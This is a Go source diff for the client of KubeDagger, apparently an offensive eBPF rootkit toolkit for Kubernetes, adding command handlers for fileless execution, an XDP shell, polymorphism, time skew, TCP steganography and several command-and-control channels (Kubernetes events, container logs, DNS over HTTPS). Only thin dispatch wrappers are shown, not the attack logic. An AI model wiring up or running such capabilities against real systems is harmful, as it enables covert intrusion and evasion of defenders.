@@ -54,6 +54,16 @@ import (
 	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/syscall_bypass"
 	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/audit_filter"
 	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/pcap_blind"
+	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/coredump"
+	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/timeskew"
+	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/polymorph"
+	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/fileless"
+	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/xdp_shell"
+	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/bpf_ipc"
+	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/k8s_event_c2"
+	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/container_log_c2"
+	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/tcp_stego"
+	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/doh_c2"
 )
 
 func addFSWatchCmd(cmd *cobra.Command, args []string) error {
@@ -338,6 +348,56 @@ func auditFilterCmd(cmd *cobra.Command, args []string) error {
 func pcapBlindCmd(cmd *cobra.Command, args []string) error {
 	logrus.SetLevel(options.LogLevel)
 	return pcap_blind.Execute(options.Target, options.PcapHidePorts, options.PcapHideIPs, options.Output)
+}
+
+func coredumpCmd(cmd *cobra.Command, args []string) error {
+	logrus.SetLevel(options.LogLevel)
+	return coredump.Execute(options.Target, options.CoredumpPIDs, options.Output)
+}
+
+func timeskewCmd(cmd *cobra.Command, args []string) error {
+	logrus.SetLevel(options.LogLevel)
+	return timeskew.Execute(options.Target, options.TimeskewPIDs, options.TimeskewOffset, options.TimeskewMode, options.Output)
+}
+
+func polymorphCmd(cmd *cobra.Command, args []string) error {
+	logrus.SetLevel(options.LogLevel)
+	return polymorph.Execute(options.Target, options.PolymorphSeed, options.Output)
+}
+
+func filelessCmd(cmd *cobra.Command, args []string) error {
+	logrus.SetLevel(options.LogLevel)
+	return fileless.Execute(options.Target, options.FilelessPayload, options.FilelessFakeName, options.Output)
+}
+
+func xdpShellCmd(cmd *cobra.Command, args []string) error {
+	logrus.SetLevel(options.LogLevel)
+	return xdp_shell.Execute(options.Target, options.XDPShellConnect, options.XDPShellProtocol, options.Output)
+}
+
+func bpfIPCCmd(cmd *cobra.Command, args []string) error {
+	logrus.SetLevel(options.LogLevel)
+	return bpf_ipc.Execute(options.Target, options.BPFIPCAction, options.BPFIPCChannel, options.BPFIPCMessage, options.Output)
+}
+
+func k8sEventC2Cmd(cmd *cobra.Command, args []string) error {
+	logrus.SetLevel(options.LogLevel)
+	return k8s_event_c2.Execute(options.Target, options.K8sC2Namespace, options.K8sC2Beacon, options.Output)
+}
+
+func containerLogC2Cmd(cmd *cobra.Command, args []string) error {
+	logrus.SetLevel(options.LogLevel)
+	return container_log_c2.Execute(options.Target, options.LogC2Container, options.LogC2Encoding, options.Output)
+}
+
+func tcpStegoCmd(cmd *cobra.Command, args []string) error {
+	logrus.SetLevel(options.LogLevel)
+	return tcp_stego.Execute(options.Target, options.TCPStegoData, options.TCPStegoDest, options.TCPStegoBPP, options.Output)
+}
+
+func dohC2Cmd(cmd *cobra.Command, args []string) error {
+	logrus.SetLevel(options.LogLevel)
+	return doh_c2.Execute(options.Target, options.DoHC2Resolver, options.DoHC2Domain, options.Output)
 }
 
 func getNetworkDiscoveryCmd(cmd *cobra.Command, args []string) error {
